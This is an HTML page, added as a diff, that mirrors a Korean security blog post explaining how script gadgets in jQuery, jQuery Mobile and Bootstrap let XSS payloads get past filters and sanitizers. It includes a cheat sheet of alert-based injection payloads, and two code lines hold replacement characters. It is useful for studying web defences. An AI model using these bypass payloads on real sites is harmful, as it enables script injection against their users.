@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>Bypass DOM XSS Filter/Mitigation via Script Gadgets | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="Bypass DOM XSS Filter/Mitigation via Script Gadgets">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-bypass-dom-xss/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Bypass DOM XSS Filter/Mitigation via Script Gadgets">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-bypass-dom-xss/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Bypass DOM XSS Filter/Mitigation via Script Gadgets","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-bypass-dom-xss/","datePublished":"2017-10-18T00:00:00+00:00","dateModified":"2023-02-21T00:00:00+00:00","image":"https://1.bp.blogspot.com/-0-j4Bk3I3tY/WedaT1tOqDI/AAAAAAAACl8/L7moMz70a8UpXqb5nMLY86UpQLTdSw6MACLcBGAs/s1600/bbbbz.jpg"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/"},{"@type":"ListItem","position":5,"name":"Bypass DOM XSS Filter/Mitigation via Script Gadgets"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">Bypass DOM XSS Filter/Mitigation via Script Gadgets</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2017-10-18">
+                        OCTOBER 18, 2017
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>최근 Blackhat2017 USA에서 &quot;Breaking XSS mitigations via Script Gadgets&quot; 라는 제목으로 XSS 관련 발표가 있었습니다. XSS 우회패턴 만들때 도움될 수 있는 부분이니 정리해서 포스팅 작성합니다.</p>
+<p>앞서 발표자료에 이런말이 있습니다.</p>
+<blockquote>
+<p>Fixing XSS is hard. Let’s instead focus on mitigating the attack.</p>
+</blockquote>
+<p>아무리 열심히 대응해도 다시 분석하면 또 나오고.. 물론 보안 전체적으로도 유효한 말이지만, XSS에서 보니 더욱 다가오네요. 오늘은 Script Gadget을 이용한 XSS Bypass 기법에 대한 이야기를 하려합니다.</p>
+<h2 id="xss-filter-rule">XSS Filter rule</h2>
+<p>대체로 Application단에서의 XSS 대응은 개발자가 직접하거나, XSS 관련 프레임워크로 막습니다.
+이외에도 브라우저, 라이브러리 등등 끌어오는 코드에서도 XSS에 대한 대응 로직은 존재합니다.</p>
+<p>다만 WAF, XSS Filter 들은 다들 다른 규칙을 가지고 있지만 어느정도 공통적인 부분들이 존재합니다.</p>
+<p><img loading="lazy" src="https://2.bp.blogspot.com/-PKQdP9EzR60/WedacoRWh6I/AAAAAAAACmA/6nfU1PHFz9Ax7ien1wQ316olsiuvUOF7gCLcBGAs/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_153.png" alt="" /></p>
+<p>단순하게 보면 정상적인 태그와 핸들러, 즉 공격에 사용될 가능성이 낮은 것들은 허용하고 공격에 자주쓰이는 것들은 필터링합니다.</p>
+<p>필터링되지 않는 것들</p>
+<ul>
+<li><code>&lt;br&gt;</code></li>
+<li><code>&lt;a&gt;</code></li>
+<li><code>&lt;p&gt;</code></li>
+<li><code>width=</code></li>
+<li><code>height=</code></li>
+</ul>
+<p>필터링되는 것들</p>
+<ul>
+<li><code>&lt;script&gt;</code></li>
+<li><code>&lt;iframe&gt;</code></li>
+<li><code>onerror=</code></li>
+<li><code>onmouserover=</code></li>
+<li><code>onfocus=</code></li>
+</ul>
+<p>이런 필터들은 <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/01/web-hacking-xxn-attackx-xss-nightmare-r.html">XXN</a> 기법처럼 정규식을 풀어서 넘어갈수도 있고 이전에 소개해드렸던 방법()처럼 태그와 핸들러, 구문에 대한 인지가 어렵도록 하는 방법들이 있습니다. 무수히 많죠. Script gadget을 이용한 방법 또한 위에 방법들과 유사한 우회기법입니다.</p>
+<p><img loading="lazy" src="https://4.bp.blogspot.com/-k_qoQaRSI0g/WedcKD7p4eI/AAAAAAAACmM/UcUQ8QCHXGg4c8T8jFGuRjzTyi2HC4WBACLcBGAs/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_154.png" alt="" />
+<em>MSDN에서의 가이드라인</em></p>
+<h2 id="javascript-selector">Javascript Selector</h2>
+<p>Javascript Selector는 JS에서 Element를 찾는 것을 의미합니다. 의미를 알고 계셨을수도 있고 몰랐을수도 있지만 JS를 다루다보면 이미 쓰고있는 모습을 발견하실거라 생각이 드네요. 그만큼 아주 편리하고 현재 많은 코드들에 사용되고 있다는 소리입니다.</p>
+<p>별다른거 없습니다. 우리가 HTML내 Element를 찾기 위해서 무엇을 사용하나요?</p>
+<pre><code class="language-javascript hljs">getElementById<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>이런 계열의 함수를 많이 사용합니다. 바로 이 친구들이 Selector입니다. 몇가지 케이스를 더 볼까요?</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;https://code.jquery.com/jquery-3.2.1.js&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">hahwul</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;hwul&#39;</span> <span class="hljs-attr">class</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;class12&#39;</span> <span class="hljs-attr">data-foo</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;bar&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">hahwul</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+  t1 <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>querySelectorAll<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;hahwul&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// tag 이름
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span>  t2 <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>querySelectorAll<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;#hwul&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// tag id
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span>  t3 <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>querySelectorAll<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;.class12&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// class 이름
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span>  t4 <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>querySelectorAll<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;[data-foo]&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// attribute name
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span>  t5 <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>querySelectorAll<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;[data-foo^=bar]&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// attribute value
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span>  t6 <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>getElementById<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;#hwul&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+  t7 <span class="hljs-operator">=</span> $<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;hwul&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// jquery selector
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span> console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>t1<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>t2<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>t3<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>t4<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>t5<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>t6<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>t7<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p><img loading="lazy" src="https://1.bp.blogspot.com/-0WDYWXYxaqI/Wedc7H81qSI/AAAAAAAACmo/uN3AEst9mHYtfKuNhX0_loJIQw9XMuuuwCLcBGAs/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_160.png" alt="" /></p>
+<p>Frameworks(jquery 예시)에선 이런식으로 표현되죠. (위에서 t7)</p>
+<pre><code class="language-javascript hljs">$<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;&lt;jquery selector&gt;&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>append<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;hahwul&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<p>Bootstrap에선</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-toggle</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;asd&#39;</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;iamtitle&#39;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>이런것들이 Selector입니다.</p>
+<h2 id="what-is-script-gadgets">What is script gadgets?</h2>
+<p>script gadget은 HTML Injection을 통해 공식적으로 실행이 가능한 Javascript 코드를 의미합니다.
+즉 XSS 같이 의도하지 않은 코드가 아닌 정상적으로 코드로 보는 Javascript 이죠.</p>
+<p>그렇기 때문에 Framework나 브라우저 등 여러 Filter/Mitigation를 넘어 공격코드가 동작할 수 있게 해주죠.</p>
+<p>이런 가젯은 대표적으로.. 이런것들이 있습니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>querySelector<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+<span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>getElementById<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+<span class="hljs-built_in">eval</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+<span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>createElement<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+callback<span class="hljs-punctuation">.</span>apply<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+<span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>익숙하시죠? 방금봤던 Selector에요. 이를 이용한 코드들을 Script Gadget입니다 :)</p>
+<h2 id="bypass-xss-filter-and-mitigation">Bypass XSS Filter and Mitigation</h2>
+<p>자 이제 Script Gadget을 통해 XSS Filter에 대해 우회하는 방법에 대해 이야기하죠.
+먼저 아래 코드를 봅시다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;https://code.jquery.com/jquery-3.2.1.js&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-role</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">data-text</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;www.hahwul.com&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+ <span class="hljs-keyword">var</span> buttons <span class="hljs-operator">=</span> $<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;[data-role=button]&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ buttons<span class="hljs-punctuation">.</span>html<span class="hljs-punctuation">(</span>buttons<span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>getAttribute<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;data-text&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>과연 이 코드는 실행되면 어떤일이 일어날까요?</p>
+<p><img loading="lazy" src="https://1.bp.blogspot.com/-O5UYPPL-x_g/WedckwT97WI/AAAAAAAACmY/c9NJr8-ZHuYDb3J88MHD_XiYfi-dQwXmQCLcBGAs/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_157.png" alt="" />)</p>
+<p>별다른거 없습니다. data-role이 button인 div 태그 내 html 영역으로 data-text의 값이 쓰여집니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-role</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;button&quot;</span> ��� <span class="hljs-punctuation">&gt;</span>www.hahwul.com<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>눈치빠르면 벌써 감이왔을텐데요. 다른 XSS 우회 기법들과 유사합니다. data-text에 우린 공격코드를 넣어주면되죠.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;https://code.jquery.com/jquery-3.2.1.js&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-role</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">data-text</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&lt;script&gt;alert(45)&lt;/script&gt;&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+ <span class="hljs-keyword">var</span> buttons <span class="hljs-operator">=</span> $<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;[data-role=button]&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ buttons<span class="hljs-punctuation">.</span>html<span class="hljs-punctuation">(</span>buttons<span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>getAttribute<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;data-text&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p><img loading="lazy" src="https://3.bp.blogspot.com/-08IJIV90Juc/WedcspNE1kI/AAAAAAAACmg/yWcFuii4HyAUNn0wxp293ICYap677bwXACLcBGAs/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_158.png" alt="" /></p>
+<p>오호!</p>
+<p>약간 비꼬아서 HTML Char로 던져도..</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;https://code.jquery.com/jquery-3.2.1.js&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-role</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">data-text</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&amp;lt;script&amp;gt;alert(45)&amp;lt;/script&amp;gt;&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+ <span class="hljs-keyword">var</span> buttons <span class="hljs-operator">=</span> $<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;[data-role=button]&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+ buttons<span class="hljs-punctuation">.</span>html<span class="hljs-punctuation">(</span>buttons<span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>getAttribute<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;data-text&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p><a href="https://1.bp.blogspot.com/-KB6F1QonoLI/WedcysYspzI/AAAAAAAACmk/8ZAvH7L6EdILtKMlvssEQbd8W904gZTlgCLcBGAs/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_159.png"><img loading="lazy" src="https://1.bp.blogspot.com/-KB6F1QonoLI/WedcysYspzI/AAAAAAAACmk/8ZAvH7L6EdILtKMlvssEQbd8W904gZTlgCLcBGAs/s640/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_159.png" alt="" /></a></p>
+<p>이런식으로 풀려서 잘 노출됩니다. Script gadget을 이용해서도 XSS가 가능합니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-role</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;button&quot;</span> ��� <span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">45</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>이 자체로만으로도 어느정도 사용할 수 있겠지만 재미있는점은 여기있습니다.</p>
+<p>바로 여러 Framework, Library에서 Selector, Script Gadget을 많이 사용한다는거죠. 이미 script 코드는 들어가 있기 때문에 우린 data-text 같은 영역을 잘 활용해서 코드만 넣어주면 트리거 시킬 수 있습니다.</p>
+<p>하나 예를들면..</p>
+<p>HTML sanitizers에선 title 속성에 대한 값은 안전하다고 판단하여 별도로 필터링하지 않습니다.
+다만 Bootstrap에는 Script Gadget 중 하나는 title 값을 로드하여 innerHTML 영역으로 넘기기 때문에 XSS 공격에 사용될 수 있죠.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-toggle</span><span class="hljs-operator">=</span><span class="hljs-string">tooltip</span> <span class="hljs-attr">data-html</span><span class="hljs-operator">=</span><span class="hljs-string">true</span> <span class="hljs-attr">title</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;&lt;script&gt;alert(45)&lt;/script&gt;&#39;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h2 id="bypass-xss-cheat-sheetscript-gadgets">Bypass XSS Cheat sheet(+script gadgets)</h2>
+<p>각 Framework, Library에서 사용하는 script gadget과 이를 이용한 공격 case 입니다.</p>
+<p>Jquery</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">form</span> <span class="hljs-attr">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;child&quot;</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;ownerDocument&quot;</span><span class="hljs-punctuation">/</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">45</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">form</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Jquery Mobile</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-role</span><span class="hljs-operator">=</span><span class="hljs-string">popup</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;--&gt;&lt;script&gt;&quot;use strict&quot;
+</span><span class="hljs-string">alert(45)&lt;/script&gt;&#39;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Bypassing sanitizers via jQuery Mobile</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">data-role</span><span class="hljs-operator">=</span><span class="hljs-string">popup</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;--&gt;&lt;script&gt;alert(45)&lt;/script&gt;&#39;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>Bootstrap</p>
